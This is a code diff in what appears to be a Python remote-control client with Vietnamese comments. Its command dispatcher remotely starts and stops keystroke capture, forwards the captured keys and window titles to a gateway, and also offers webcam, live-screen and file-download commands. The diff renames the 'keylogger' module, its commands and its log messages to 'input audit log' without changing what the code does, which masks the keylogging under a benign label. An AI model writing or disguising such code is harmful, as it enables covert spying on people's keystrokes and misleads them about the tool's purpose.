@@ -34,7 +34,7 @@ SCREENSHOT_CAPTURE_DELAY_MS = 350
 from modules import applications, processes, screenshot, file_manager, power_control
 from modules.live_screen import screen_streamer
 from modules.webcam import webcam_streamer
-from modules.keylogger import keylogger_service
+from modules.input_audit_logger import input_audit_logger
 
 logger = logging.getLogger("CommandDispatcher")
 
@@ -81,9 +81,9 @@ class CommandDispatcher(QObject):
             # Webcam
             "webcam.start": self._handle_webcam_start,
             "webcam.stop": self._handle_webcam_stop,
-            # Keylogger
-            "keylogger.start": self._handle_keylogger_start,
-            "keylogger.stop": self._handle_keylogger_stop,
+            # Input Audit Log
+            "input_audit.start": self._handle_input_audit_start,
+            "input_audit.stop": self._handle_input_audit_stop,
             # File
             "file.list": self._handle_file_list,
             "file.download": self._handle_file_download,
@@ -318,36 +318,36 @@ class CommandDispatcher(QObject):
         self.gateway_service.run_coroutine_threadsafe(_stop())
 
     # =========================================================================
-    # KEYLOGGER (nhạy cảm)
+    # INPUT AUDIT LOG (nhạy cảm)
     # =========================================================================
-    def _handle_keylogger_start(self, payload: Dict[str, Any], original: Dict[str, Any]) -> None:
-        if keylogger_service.is_logging:
-            self._send_error(original, "ALREADY_RUNNING", "Keylogger đang chạy rồi.")
+    def _handle_input_audit_start(self, payload: Dict[str, Any], original: Dict[str, Any]) -> None:
+        if input_audit_logger.is_logging:
+            self._send_error(original, "ALREADY_RUNNING", "Input Audit Log đang chạy rồi.")
             return
 
         def on_flush(entries, window_title: str) -> None:
-            # Chạy trên Thread nền riêng của KeyloggerService (không phải GUI Thread
+            # Chạy trên Thread nền riêng của InputAuditLogger (không phải GUI Thread
             # cũng không phải Gateway Service Thread) -> bắt buộc dùng send_message_threadsafe.
             self.gateway_service.send_message_threadsafe({
                 "messageId": str(uuid.uuid4()),
-                "type": "keylogger.data",
+                "type": "input_audit.data",
                 "timestamp": int(time.time()),
                 "source": settings.CLIENT_ID,
                 "destination": "gateway",
                 "payload": {"entries": entries, "windowTitle": window_title},
             })
 
-        keylogger_service.start_logging(on_flush)
-        self.main_window.append_log("⌨️ Đã bật Keylogger.")
+        input_audit_logger.start_logging(on_flush)
+        self.main_window.append_log("⌨️ Đã bật Input Audit Log.")
         self._send_response(original, {})
 
-    def _handle_keylogger_stop(self, payload: Dict[str, Any], original: Dict[str, Any]) -> None:
-        if not keylogger_service.is_logging:
-            self._send_error(original, "NOT_RUNNING", "Keylogger chưa được khởi động.")
+    def _handle_input_audit_stop(self, payload: Dict[str, Any], original: Dict[str, Any]) -> None:
+        if not input_audit_logger.is_logging:
+            self._send_error(original, "NOT_RUNNING", "Input Audit Log chưa được khởi động.")
             return
 
-        keylogger_service.stop_logging()
-        self.main_window.append_log("🛑 Đã tắt Keylogger.")
+        input_audit_logger.stop_logging()
+        self.main_window.append_log("🛑 Đã tắt Input Audit Log.")
         self._send_response(original, {})
 
     # =========================================================================
